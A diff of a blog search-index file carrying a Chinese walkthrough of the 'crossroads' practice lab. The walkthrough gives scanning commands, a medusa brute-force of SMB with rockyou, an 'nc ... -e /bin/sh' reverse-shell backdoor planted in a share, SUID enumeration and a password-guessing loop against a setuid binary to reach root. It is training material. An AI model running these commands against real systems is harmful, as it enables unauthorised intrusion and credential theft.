@@ -4,12 +4,31 @@
   
     
     <entry>
+      <title>misc</title>
+      <link href="/2024/08/08/misc/"/>
+      <url>/2024/08/08/misc/</url>
+      
+        <content type="html"><![CDATA[<hr>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>crossroads_vh</title>
       <link href="/2024/08/05/crossroads-vh/"/>
       <url>/2024/08/05/crossroads-vh/</url>
       
         <content type="html"><![CDATA[<hr><h5 id="主机扫描"><a href="#主机扫描" class="headerlink" title="主机扫描"></a>主机扫描</h5><p>使用fscan -h 172.20.10.0&#x2F;26 或是fping -g 172.20.10.0&#x2F;26</p><p><img src="/2024/08/05/crossroads-vh/1.png" alt="1"></p><h5 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h5><p>.&#x2F;fscan -h 172.20.10.3</p><p><img src="/2024/08/05/crossroads-vh/2.png" alt="2"></p><p>存活主机开放端口：</p><p>139 445 80</p><p><strong>Samba概述</strong></p><p>Samba是一个用于在Linux和Windows之间传输或共享文件的文件服务器。它采用客户端-服务器（C&#x2F;S）模式工作，并使用UDP和TCP端口137、138、139和445。Samba可以用于搭建局域网文件服务器，方便共享资源，也可以用于共享打印机。</p><p>使用enum4linux -a 172.20.10.3</p><p><img src="/2024/08/05/crossroads-vh/3.png" alt="3"></p><p>发现没有可利用的匿名用户，暂时放弃这一攻击点</p><h5 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h5><p>在端口扫描时发现还存在80端口，所以先进行目录扫描</p><p>dirsearch -u 172.20.10.3</p><p><img src="/2024/08/05/crossroads-vh/4.png" alt="4"></p><p>存在&#x2F;robots.txt路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /crossroads.png</span><br></pre></td></tr></table></figure><p>有一个图片路径</p><p><img src="/2024/08/05/crossroads-vh/5.png" alt="5"></p><p>有一张图片，不知道该如何利用？图片加密？？</p><p>再仔细检查下</p><p><img src="/2024/08/05/crossroads-vh/6.png" alt="6"></p><p>这里有一个用户需要密码登陆，但是smbclient 需要密码</p><p><img src="/2024/08/05/crossroads-vh/7.png" alt="7"></p><p>使用medusa 进行爆破</p><p>medusa  -d  查看可以爆破的服务，是有smb服务的。<br>medusa  -u  albert -P &#x2F;usr&#x2F;share&#x2F;wordlist&#x2F;rockyou.txt -M smbnt -h 172.20.10.3  -t 10</p><p><img src="/2024/08/05/crossroads-vh/8.png" alt="8"></p><p>这里成功破解出密码 bradley1</p><p>登陆至共享空间</p><p>smbclient  &#x2F;&#x2F;172.20.10.3&#x2F;smbshare  -U albert</p><p><img src="/2024/08/05/crossroads-vh/9.png" alt="9"></p><p>这里有一个配置文件，我们get下来</p><p><img src="/2024/08/05/crossroads-vh/10.png" alt="10"></p><p>这里有一个脚本，但是smbshare中并没有这个脚本，所以可以利用它写一个后门</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 172.20.10.3 6667 -e /bin/sh</span><br></pre></td></tr></table></figure><p>这是nc反弹shell脚本</p><p>将该脚本put至smbshare </p><p>put smbclient.sh </p><p><img src="/2024/08/05/crossroads-vh/11.png" alt="11"></p><p>成功反弹shell</p><p>python -c ‘import pty; pty.spawn(“&#x2F;bin&#x2F;bash”)’  切换至终端shell</p><p><img src="/2024/08/05/crossroads-vh/12.png" alt="12"></p><p>拿到第一个flag</p><p>检查是否有suid提权</p><p>find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</p><p><img src="/2024/08/05/crossroads-vh/13.png" alt="13"></p><p>发现有一个beroot但是需要密码</p><p><img src="/2024/08/05/crossroads-vh/14.png" alt="14"></p><p>albert目录下存在一个crossroads.png   </p><p>将其下载至kali中，猜测改图片存在内容隐写，并且存在beroot suid执行的密码</p><p>尝试各种图片隐写方法</p><p>stegoveritas ‘&#x2F;home&#x2F;kali&#x2F;Desktop&#x2F;crossroads.png’ </p><p><img src="/2024/08/05/crossroads-vh/15.png" alt="15"></p><p>在这里找到疑似密码字典文件</p><p>for i in <code>cat passwd.txt</code>;do echo $i &gt;&gt; tmp;echo $i|.&#x2F;beroot &gt;&gt; tmp ;done</p><p>这段shell命令主要是从passwd.txt 中循环获取一行给i，把i变量内容追加到tmp文件中，把i的值以管道形式作为beroot的输入，结果追加到tmp文件中</p><p><img src="/2024/08/05/crossroads-vh/17.png" alt="17"></p><p>这里看到 do ls and find root creds</p><p>所以是执行完命令</p><p>for i in <code>cat passwd.txt</code>;do echo $i &gt;&gt; tmp;echo $i|.&#x2F;beroot &gt;&gt; tmp ;done</p><p>后输入ls 发现rootcreds</p><p>cat rootcreds<br>root<br>__ <strong>drifting</strong> __</p><p>得到密码</p><p>su root 成功获取到第二个flag</p><p><img src="/2024/08/05/crossroads-vh/18.png" alt="18"></p><p>这个靶场 主要用到enum4linux，smbclient，stegoveritas三个工具</p>]]></content>
       
+      
+      <categories>
+          
+          <category> 靶场练习 </category>
+          
+      </categories>
       
       
         <tags>
